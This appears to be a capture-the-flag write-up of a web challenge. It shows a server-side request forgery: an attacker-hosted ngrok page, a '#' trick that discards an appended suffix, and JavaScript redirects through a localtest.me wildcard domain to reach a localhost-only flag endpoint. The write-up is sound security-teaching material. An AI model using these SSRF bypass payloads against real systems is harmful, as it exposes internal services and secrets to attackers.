# Enumeration

We are introduced with this page , it takes the search engine (google,duckduckgo,search encrypt) and the Query we want

![error](/assets/images/CTFs/meme-generator/20221001210834.png)

testing the application functions we can try google engine with any word , and we can see the image rendered as follows

![error](/assets/images/CTFs/meme-generator/20221001210954.png)

The request is issued to `/api/generate` with the search engine name and the query

![error](/assets/images/CTFs/meme-generator/20221001211043.png)

Playing with the searchengine i noticed it adds `.com` at the end , so for example sending firefox returns `firefox.com` result

![error](/assets/images/CTFs/meme-generator/20221001211454.png)

now we can take a look at the source code which we can find at `/source` , we can focus on the flag part.

```python
..
...
@app.route("/flag")
def flag():
    # TODO: Fix typo
    if request.remote_addr == "127.0.0.1" and request.url.startswith("http://l0calhost"):
        return os.getenv("FLAG"), 200
    return "Nice try", 200
app.run("0.0.0.0", 8080)
```

It will print the flag only if we visited the `/flag` from the localhost and the notice the requested url must start with `http://l0calhost`

So basically there are a lot of Scenarios which we can take like registering subdomain start with `l0calhost` and stuff. but we can think of other solutions ;)

# Exploitation

We want the application itself to visit the `127.0.0.1:8080/flag` and the url should start with `http://l0calhost` to pass the check

If we fire up ngrok http server and host `index.html` with the content:

```html
<html>
  <script>
    document.write("a");
  </script>
</html>
```

and at the search-engine we can use the ngrok url and add **#** at the end to comment the appended `.com` as we discussed before. and we can run javascript

![error](/assets/images/CTFs/meme-generator/20221001212539.png)

now we can try to redirect the application to visit `127.0.0.1:8080/flag` with the `document.location` method

```js
document.location = "http://127.0.0.1:8080/flag";
```

but as expected it will not pass the check of `request.url.startswith("http://l0calhost"):`

![error](/assets/images/CTFs/meme-generator/20221001212835.png)

so we need some how to make a url which start with the `http://l0calhost` and also redirect the application to the `http://127.0.0.1:8080/flag`. searching for such redirectors we can see [This](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery#bypass-localhost-with-a-domain-redirection)

```cmd
http://localtest.me  ---> 127.0.0.1
```

So the mentioned domain and all wildcards points to the `127.0.0.1`

![error](/assets/images/CTFs/meme-generator/20221001213134.png)

So if we craft the following url to be redirected to it

```js
document.location = "http://l0calhost.localtest.me:8080/flag";
```

![error](/assets/images/CTFs/meme-generator/20221001213306.png)

Hosting the `index.html` in ngrok with the content

```html
<html>
  <h1>test</h1>
  <script>
    document.location = "http://l0calhost.localtest.me:8080/flag";
  </script>
</html>
```

Sending the request as follows :

Finally we get the Flag !
